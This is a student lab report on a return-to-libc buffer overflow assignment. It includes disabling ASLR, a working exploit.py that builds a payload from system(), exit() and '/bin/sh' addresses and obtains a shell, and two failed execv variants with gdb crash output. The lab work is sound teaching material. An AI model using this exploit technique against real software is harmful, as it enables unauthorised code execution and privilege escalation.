# HMWK4 Return-To-LibC Lab Report

- [HMWK4 Return-To-LibC Lab Report](#hmwk4-return-to-libc-lab-report)
  - [Env Setup](#env-setup)
  - [Task 1: Finding out the Addresses of libc Functions](#task-1-finding-out-the-addresses-of-libc-functions)
  - [Task 3: Launching the Attack](#task-3-launching-the-attack)
  - [Task 4: Defeat Shell's Countermeasures](#task-4-defeat-shells-countermeasures)

By Robert D. Hernandez (rherna70@uic.edu)

## Env Setup 

```sh
➜  hw4 git:(hw4/code_reuse_attack_ret2libc) ✗ sudo sysctl -w kernel.randomize_va_space=0
[sudo] password for rherna70: 
kernel.randomize_va_space = 0
```

```sh
sudo ln -sf /bin/zsh /bin/sh
 ```

## Task 1: Finding out the Addresses of libc Functions

I used `cyclic 100` to populate a version of `badfile` to first find the correct offset for the size of the vulnerable buffer.  This revealed 'haaa' which I then used `cyclic -l haaa` to find the value 28.  From there I populated the python exploit construction code with the correct addresses for `/bin/sh` as well as `exit` from from using pwndbg.  While I had the option of using the env var, I decided instead to use the `/bin/sh` string in libc.so so the attack is more portable.

Task 2: Putting the shell string in the memory

For completeness sake, I did these steps even though I chose to use the `/bin/sh` string from `libc.so` just to observe the memory address not changing, and to get experience compiling a 32-bit program on a 62 bit machine.

```sh
➜  hw4 git:(hw4/code_reuse_attack_ret2libc) ✗ export MYSHELL=/bin/sh
➜  hw4 git:(hw4/code_reuse_attack_ret2libc) ✗ env | grep MYSHELL    
MYSHELL=/bin/sh
➜  hw4 git:(hw4/code_reuse_attack_ret2libc) ✗ cat prntenv.c 
#include <stdio.h>
#include <stdlib.h>

void main() {
        char* shell = getenv("MYSHELL");
        if (shell) {
                printf("%x\n", (unsigned int)shell);
        }
}

➜  hw4 git:(hw4/code_reuse_attack_ret2libc) ✗ gcc -m32 -o prntenv prntenv.c
➜  hw4 git:(hw4/code_reuse_attack_ret2libc) ✗ ./prntenv 
ffffdfe6
➜  hw4 git:(hw4/code_reuse_attack_ret2libc) ✗ ./prntenv
ffffdfe6
```

## Task 3: Launching the Attack

After finding the correct memory addresses to use in the attack, I used the following content for `exploit.py`

```python
#!/usr/bin/env python3
import sys

# Fill content with non-zero values
content = bytearray(0xaa for i in range(300))

X = 36
# X = 84
sh_addr = 0xf7f3e0d5       # The address of "/bin/sh" in libc.so
# sh_addr = 0xffffefe6       # The address of "/bin/sh" in the ENV 
content[X:X+4] = (sh_addr).to_bytes(4,byteorder='little')

# Y = 76
Y = 28
system_addr = 0xf7dc9170 # The address of system()
content[Y:Y+4] = (system_addr).to_bytes(4,byteorder='little')

Z = 32 
# Z = 80
exit_addr = 0xf7dbb460     # The address of exit()
content[Z:Z+4] = (exit_addr).to_bytes(4,byteorder='little')

# Save content to a file
with open("badfile", "wb") as f:
  f.write(content)
```

I was able to launch the attack and get the c program to drop me into a shell, here is the log of the attack for completeness sake:

```
➜  hw4 git:(hw4/code_reuse_attack_ret2libc) ✗ cat badfile 
����������������������������p���`���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������%                                                           
➜  hw4 git:(hw4/code_reuse_attack_ret2libc) ✗ ls
Makefile  Taskfile.yml  badfile  exploit.py  lab_report.md  prntenv  prntenv.c  retlib  retlib.c
➜  hw4 git:(hw4/code_reuse_attack_ret2libc) ✗ gdb ./retlib 
GNU gdb (Ubuntu 12.1-0ubuntu1~22.04.2) 12.1
Copyright (C) 2022 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Poetry could not find a pyproject.toml file in /home/rherna70/code/CS487/hw4 or its parents
pwndbg: loaded 169 pwndbg commands and 48 shell commands. Type pwndbg [--shell | --all] [filter] for a list.
pwndbg: created $rebase, $base, $bn_sym, $bn_var, $bn_eval, $ida GDB functions (can be used with print/break)
Reading symbols from ./retlib...
(No debugging symbols found in ./retlib)
------- tip of the day (disable with set show-tips off) -------
GDB and Pwndbg parameters can be shown or set with show <param> and set <param> <value> GDB commands
pwndbg> r
Starting program: /home/rherna70/code/CS487/hw4/retlib 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Address of input[] inside main():  0xffffcc60
Input size: 300
Address of buffer[] inside bof():  0xffffcc30
Frame Pointer value inside bof():  0xffffcc48
[Attaching after Thread 0xf7fbf500 (LWP 57641) vfork to child process 57644]
[New inferior 2 (process 57644)]
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[Detaching vfork parent process 57641 after child exec]
[Inferior 1 (process 57641) detached]
process 57644 is executing new program: /usr/bin/zsh
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
process 57644 is executing new program: /usr/bin/zsh
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
$ 

```


## Task 4: Defeat Shell's Countermeasures

I attempted to build a return oriented attack defeating the countermeasures by using env vars for string address values.

Unfortunately, while running the program I received segmentation faults.  I attempted to build my payload in both directions, and am unsure why execution did not create a shell as expected.


Below you will find two versions of exploit.py used to build the exploit payload as well as the output from the latter version, of which both verions produced similar exceptions.  The difference between the two versions is the memory mapping of the content buffer, you'll see the four bytes of zero is placed on either side between the two versions.

Verion 1
```python
#!/usr/bin/env python3
import sys

# Fill content with non-zero values
content = bytearray(0xaa for i in range(300))

X = 48
zero_addr = 0x00000000    # four bytes of zeros to terminate the string
content[X:X+4] = (zero_addr).to_bytes(4,byteorder='little')

X = 44
dash_p_addr = 0xffffdfeb    # The address of "-p" in the ENV 
content[X:X+4] = (dash_p_addr).to_bytes(4,byteorder='little')

X = 40
# X = 84
bash_addr = 0xffffdfda   # The address of "/bin/bash" in the ENV 
# sh_addr = 0xf7f3e0d5       # The address of "/bin/sh" in libc.so
# sh_addr = 0xffffefe6     # The address of "/bin/sh" in the ENV 
content[X:X+4] = (bash_addr).to_bytes(4,byteorder='little')
X = 36
content[X:X+4] = (bash_addr).to_bytes(4,byteorder='little')

# Y = 76
Y = 28
# system_addr = 0xf7dc9170 # The address of system()
execv_addr = 0xf7e5fa00 # The address of evecv()
content[Y:Y+4] = (execv_addr).to_bytes(4,byteorder='little')

Z = 32 
# Z = 80
exit_addr = 0xf7dbb460     # The address of exit()
content[Z:Z+4] = (exit_addr).to_bytes(4,byteorder='little')

# Save content to a file
with open("badfile", "wb") as f:
  f.write(content)

```


Version 2
```python
#!/usr/bin/env python3
import sys

# Fill content with non-zero values
content = bytearray(0xaa for i in range(300))

X = 48
# X = 84
bash_addr = 0xffffdfda   # The address of "/bin/bash" in the ENV 
# sh_addr = 0xf7f3e0d5       # The address of "/bin/sh" in libc.so
# sh_addr = 0xffffefe6     # The address of "/bin/sh" in the ENV 
content[X:X+4] = (bash_addr).to_bytes(4,byteorder='little')
X = 44
content[X:X+4] = (bash_addr).to_bytes(4,byteorder='little')

X = 40
dash_p_addr = 0xffffdfeb    # The address of "-p" in the ENV 
content[X:X+4] = (dash_p_addr).to_bytes(4,byteorder='little')

X = 36
zero_addr = 0x00000000    # four bytes of zeros to terminate the string
content[X:X+4] = (zero_addr).to_bytes(4,byteorder='little')


# Y = 76
Y = 28
# system_addr = 0xf7dc9170 # The address of system()
execv_addr = 0xf7e5fa00 # The address of evecv()
content[Y:Y+4] = (execv_addr).to_bytes(4,byteorder='little')

Z = 32 
# Z = 80
exit_addr = 0xf7dbb460     # The address of exit()
content[Z:Z+4] = (exit_addr).to_bytes(4,byteorder='little')

# Save content to a file
with open("badfile", "wb") as f:
  f.write(content)
```

```
pwndbg> r
Starting program: /home/rherna70/code/CS487/hw4/retlib 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Address of input[] inside main():  0xffffcc50
Input size: 300
Address of buffer[] inside bof():  0xffffcc20
Frame Pointer value inside bof():  0xffffcc38
Address of buffer[] inside bof():  0xffffcc1c
Frame Pointer value inside bof():  0xffffcc34

Program received signal SIGSEGV, Segmentation fault.
__strcpy_ia32 () at ../sysdeps/i386/i586/strcpy.S:69
69      ../sysdeps/i386/i586/strcpy.S: No such file or directory.
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────
 EAX  0
 EBX  0xfefefeff
 ECX  1
 EDX  0
 EDI  0xffffcc1c —▸ 0x565561e9 (bof+12) ◂— add ebx, 0x2ddf
 ESI  0xaaaaa6b2
 EBP  0xffffcc34 ◂— 0xaaaaaaaa
 ESP  0xffffcbfc —▸ 0x56558fc8 (_GLOBAL_OFFSET_TABLE_) ◂— 0x3ed0
 EIP  0xf7e363a0 (__strcpy_ia32+48) ◂— or al, byte ptr [esi]
──────────────────────────────────────────────────[ DISASM / i386 / set emulate on ]──────────────────────────────────────────────────
 ► 0xf7e363a0 <__strcpy_ia32+48>    or     al, byte ptr [esi]
   0xf7e363a2 <__strcpy_ia32+50>    je     __strcpy_ia32+129           <__strcpy_ia32+129>
 
   0xf7e363a4 <__strcpy_ia32+52>    stosb  byte ptr es:[edi], al
   0xf7e363a5 <__strcpy_ia32+53>    xor    eax, eax                  EAX => 0
   0xf7e363a7 <__strcpy_ia32+55>    inc    esi
   0xf7e363a8 <__strcpy_ia32+56>    or     al, byte ptr [esi]
   0xf7e363aa <__strcpy_ia32+58>    je     __strcpy_ia32+129           <__strcpy_ia32+129>
 
   0xf7e363ac <__strcpy_ia32+60>    stosb  byte ptr es:[edi], al
   0xf7e363ad <__strcpy_ia32+61>    xor    eax, eax                  EAX => 0
   0xf7e363af <__strcpy_ia32+63>    inc    esi
   0xf7e363b0 <__strcpy_ia32+64>    mov    ecx, dword ptr [esi]
──────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────
00:0000│ esp 0xffffcbfc —▸ 0x56558fc8 (_GLOBAL_OFFSET_TABLE_) ◂— 0x3ed0
01:0004│-034 0xffffcc00 —▸ 0xffffd114 —▸ 0xffffd2a0 ◂— '/home/rherna70/code/CS487/hw4/retlib'
02:0008│-030 0xffffcc04 —▸ 0xf7ffcb80 (_rtld_global_ro) ◂— 0
03:000c│-02c 0xffffcc08 —▸ 0x5655622f (bof+82) ◂— add esp, 0x10
04:0010│-028 0xffffcc0c —▸ 0xffffcc1c —▸ 0x565561e9 (bof+12) ◂— add ebx, 0x2ddf
05:0014│-024 0xffffcc10 ◂— 0xaaaaa6b2
06:0018│-020 0xffffcc14 —▸ 0xffffcc50 ◂— 0xaaaaaaaa
07:001c│-01c 0xffffcc18 —▸ 0x565561e9 (bof+12) ◂— add ebx, 0x2ddf
────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────
 ► 0 0xf7e363a0 __strcpy_ia32+48
   1 0x5655622f bof+82
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> 
```